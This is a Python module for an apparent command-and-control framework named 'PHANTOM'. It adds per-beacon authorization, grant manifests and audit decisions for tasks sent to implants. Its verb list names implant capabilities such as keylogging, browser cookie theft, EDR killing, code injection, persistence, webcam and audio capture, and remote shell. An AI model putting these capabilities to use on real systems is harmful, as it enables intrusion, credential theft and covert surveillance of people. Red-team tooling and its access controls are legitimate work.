"""task_policy.py — typed task schema for the C2 (ROADMAP P1-1).

Today a task is an arbitrary string queued with `queue_task(beacon, cmd)`.
HMAC proves WHO sent the string; nothing proves the capability behind it is
authorized for THAT beacon. This module adds the missing authorization
plane WITHOUT breaking the existing flow:

    * the structured form is {capability_id, args, ...} validated against
      a per-beacon grant set (manifest) — deny-by-default;
    * legacy strings pass through an EXPLICIT, audited compatibility
      adapter: the first verb must be a known beacon command (the same
      list the beacon itself implements — single source of truth is the
      dispatcher in main.cpp) and free-form OS shells ride only the
      `shell <cmd>` verb, which grants can revoke individually;
    * every decision (allow / deny / legacy-fallback) is auditable.

The default grant set mirrors the previous behaviour (everything allowed)
so no engagement breaks on upgrade; an operator can restrict a beacon to
an explicit manifest via `set_grants()` / env `PHANTOM_BEACON_GRANTS`.
"""

from __future__ import annotations

import os
import re
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional

# ── the beacon's own verb list (mirrors main.cpp dispatch_command) ──────────
# `shell` is the OS-execution verb; every other verb is a built-in.
BEACON_VERBS = frozenset({
    "audio", "auth-rotate", "browser-list", "browser-pivot",
    "browser-pivot-stop", "bt-scan", "bt-scan-json", "camera", "cat",
    "cd", "cd..", "cdp-cookies", "cdp-eval", "cdp-fetch", "cdp-launch",
    "cdp-nav", "cookies", "cookies-json", "dir", "download", "drives",
    "edr-kill", "edrcheck", "exec", "exit", "find", "gps", "health",
    "inject", "inject-eb", "inject-tl", "keylog", "kill", "ls",
    "mem-run", "migrate", "netinfo", "netstat", "netstat-json", "persist",
    "portfwd", "portfwd-stop", "processes", "pwd", "recon", "remote",
    "run", "screen-dump", "screen-record", "screen-record-live",
    "screen-stream", "screen-stream-stop", "screenshot", "set-sleep",
    "shell", "sleep", "smb-pipe", "smb-pipe-stop", "socks", "socks-stop",
    "sysinfo", "unpersist", "upload", "whoami", "wlan-locate",
    "wlan-scan",
})

# verbs that execute attacker-controlled code on the target — a grant set
# can exclude them without touching anything else
HIGH_IMPACT_VERBS = frozenset({
    "edr-kill", "exec", "inject", "inject-eb", "inject-tl", "mem-run",
    "migrate", "run", "shell",
})

_TASK_ID_OK = re.compile(r"^[A-Za-z0-9_.:-]{1,128}$")
_MAX_ARGS = 8
_MAX_ARG_LEN = 4096


@dataclass
class TypedTask:
    """The structured task form. `capability_id` is a grant key, `args`
    are typed strings, `expires_at` bounds the delivery window."""
    capability_id: str
    args: List[str] = field(default_factory=list)
    scope_ref: str = ""          # target/host the task is bound to
    expires_at: float = 0.0      # epoch seconds; 0 = no expiry
    task_id: str = ""
    policy_hash: str = ""        # sha256 of the grant set that authorized it

    def render(self) -> str:
        """The wire form the beacon consumes (verb + args)."""
        parts = [self.capability_id, *self.args]
        return " ".join(p for p in parts if p != "")

    def is_expired(self, now: Optional[float] = None) -> bool:
        if not self.expires_at:
            return False
        # Defensive: ISO strings / int epoch / float all accepted — a mixed
        # type from a JSON wire form must raise inside the policy (deny),
        # never crash the caller with a TypeError.
        try:
            deadline = float(self.expires_at)
        except (TypeError, ValueError):
            try:
                deadline = datetime.fromisoformat(str(self.expires_at)).timestamp()
            except ValueError:
                return True   # unparseable deadline -> treat as expired
        return (float(now) if now is not None else time.time()) > deadline


@dataclass
class PolicyDecision:
    allowed: bool
    reason: str
    mode: str = ""   # "typed" | "legacy" | "legacy-denied" | "typed-denied"
    command: str = ""


class TaskPolicy:
    """Per-beacon grant set + validation. Deny-by-default once a manifest
    exists; legacy-open until the operator narrows it."""

    def __init__(self) -> None:
        # beacon_id -> set of grant keys (a verb, or "shell:<verb>" scopes)
        self._grants: Dict[str, Optional[frozenset]] = {}
        self._default_all = True

    # ── grants ──────────────────────────────────────────────────────────

    def set_grants(self, beacon_id: str, grants: List[str]) -> None:
        """Restrict a beacon to an explicit capability manifest."""
        cleaned = {g.strip() for g in grants if g and g.strip()}
        self._grants[beacon_id] = frozenset(cleaned)

    def clear_grants(self, beacon_id: str) -> None:
        """Back to the legacy-open default (documented upgrade behaviour)."""
        self._grants.pop(beacon_id, None)

    def grants(self, beacon_id: str) -> Optional[frozenset]:
        return self._grants.get(beacon_id)

    def _authorized(self, beacon_id: str, key: str) -> bool:
        g = self._grants.get(beacon_id)
        if g is None:
            # no manifest: legacy-open (auto-persist, interact, agent tasks
            # keep working exactly as before the hardening)
            return True
        if key in g:
            return True
        # "shell" grants the OS-execution verb as a whole;
        # a plain "shell:<cmd>" entry would be per-command (not used now)
        if key.startswith("shell "):
            return "shell" in g
        return False

    # ── validation ──────────────────────────────────────────────────────

    def check_typed(self, beacon_id: str, task: TypedTask) -> PolicyDecision:
        if task.is_expired():
            return PolicyDecision(False, "task expired", "typed-denied")
        if not task.capability_id:
            return PolicyDecision(False, "missing capability_id", "typed-denied")
        if not self._authorized(beacon_id, task.capability_id):
            return PolicyDecision(
                False, f"capability '{task.capability_id}' not granted "
                       f"for beacon {beacon_id}", "typed-denied")
        if len(task.args) > _MAX_ARGS:
            return PolicyDecision(False, "too many args", "typed-denied")
        for a in task.args:
            if not isinstance(a, str) or len(a) > _MAX_ARG_LEN:
                return PolicyDecision(False, "invalid arg", "typed-denied")
        return PolicyDecision(True, "ok", "typed", task.render())

    def check_legacy(self, beacon_id: str, command: str) -> PolicyDecision:
        """The explicit compatibility adapter for string tasks."""
        cmd = (command or "").strip()
        if not cmd:
            return PolicyDecision(False, "empty command", "legacy-denied")
        if len(cmd) > 8192:
            return PolicyDecision(False, "command too long", "legacy-denied")
        verb = cmd.split(None, 1)[0]
        if verb not in BEACON_VERBS:
            return PolicyDecision(
                False, f"unknown beacon verb '{verb}' — wrap OS commands "
                       f"as 'shell <cmd>'", "legacy-denied")
        if not self._authorized(beacon_id, verb):
            return PolicyDecision(
                False, f"verb '{verb}' not granted for beacon {beacon_id}",
                "legacy-denied")
        return PolicyDecision(True, "ok", "legacy", cmd)


# module-level policy (the C2 state and the API server share this one)
_policy = TaskPolicy()


def policy() -> TaskPolicy:
    """The process-wide policy. Seeds per-beacon manifests from the env
    (`PHANTOM_BEACON_GRANTS=<id>:verb,verb;<id>:verb,verb`) on first use."""
    spec = os.environ.get("PHANTOM_BEACON_GRANTS", "").strip()
    if spec:
        for part in spec.split(";"):
            if ":" not in part:
                continue
            bid, verbs = part.split(":", 1)
            _policy.set_grants(
                bid.strip(), [v.strip() for v in verbs.split(",") if v.strip()])
        # consume: env is read once, tests/operators re-set it deliberately
        os.environ.pop("PHANTOM_BEACON_GRANTS", None)
    return _policy
